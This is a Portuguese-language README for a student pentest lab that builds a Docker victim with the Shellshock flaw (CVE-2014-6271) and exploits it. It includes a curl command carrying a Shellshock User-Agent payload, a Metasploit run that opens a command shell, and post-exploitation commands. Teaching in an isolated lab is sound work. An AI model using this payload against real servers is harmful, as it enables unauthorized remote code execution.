# Trabalho 2 - Pentest com Metasploit

Laboratorio controlado para demonstrar Shellshock (CVE-2014-6271) contra um
servico CGI vulneravel. A vitima e construida localmente para evitar depender
da imagem `vulnerables/cve-2014-6271`, que pode falhar ou sumir do Docker Hub.

## Requisitos

- Docker funcionando no WSL/Linux.
- Docker Compose instalado (`docker compose` ou `docker-compose`).

## Corrigir Docker/Compose no WSL

No ambiente testado, a integracao do Docker Desktop estava ativada e o socket
Linux existia em `/var/run/docker.sock`. O problema foi uma combinacao de:
plugin do Compose ausente inicialmente e contexto `desktop-linux` apontando
para `npipe://`, que e um protocolo do Windows e nao funciona no Docker CLI
Linux dentro do WSL.

Instale o Compose v2 dentro do Ubuntu/WSL:

```bash
sudo apt update
sudo apt install docker-compose-v2
```

Use o contexto `default`, que aponta para o socket Linux criado pela integracao
do Docker Desktop com o WSL:

```bash
docker context use default
```

Valide:

```bash
docker context ls
docker ps
docker compose version
```

Depois disso, use `docker compose`, com espaco, em vez de `docker-compose`.

Erros que motivaram essa correcao:

```text
failed to connect to the docker API at unix:///var/run/docker.sock
```

e o Compose respondeu:

```text
docker: unknown command: docker compose
docker-compose could not be found in this WSL 2 distro
```

Se aparecer `permission denied` em `/var/run/docker.sock` ou se o contexto ainda
nao enxergar o Docker Desktop, reinicie o WSL e o Docker Desktop:

```powershell
wsl --shutdown
```

Em seguida abra o Docker Desktop novamente e depois o terminal Ubuntu.

## Subir o laboratorio

Com Docker Compose v2:

```bash
docker compose up --build
```

Com Docker Compose v1:

```bash
docker-compose up --build
```

## Validar a vitima

Em outro terminal:

```bash
docker exec -it attacker curl http://172.28.0.20/cgi-bin/status.cgi
```

O retorno esperado inclui `Shellshock lab victim`.

## Demonstrar a vulnerabilidade sem Metasploit

Este comando cria o arquivo `/tmp/shellshock-proof` na vitima por meio do
cabecalho HTTP `User-Agent`:

```bash
docker exec -it attacker curl -H 'User-Agent: () { :;}; /bin/touch /tmp/shellshock-proof' http://172.28.0.20/cgi-bin/status.cgi
docker exec -it victim ls -l /tmp/shellshock-proof
```

O Apache pode responder `500 Internal Server Error` nesse teste. Para a prova
do ataque, o importante e o segundo comando mostrar que
`/tmp/shellshock-proof` foi criado como `www-data`.

## Explorar com Metasploit

Abra o console:

```bash
docker exec -it attacker /usr/src/metasploit-framework/msfconsole -r /workspace/metasploit/shellshock.rc
```

O resultado esperado inclui:

```text
The target is vulnerable.
Command shell session 1 opened
```

Se o Metasploit voltar para o prompt `msf6`, entre na sessao:

```text
sessions -i 1
```

Alguns comandos uteis para demonstrar:

```bash
id
hostname
pwd
cat /etc/os-release
```

## Entrega sugerida

- `docker-compose.yml`
- pasta `attacker/`
- pasta `victim/`
- pasta `metasploit/`
- relatorio em PDF gerado a partir de `docs/relatorio.md`
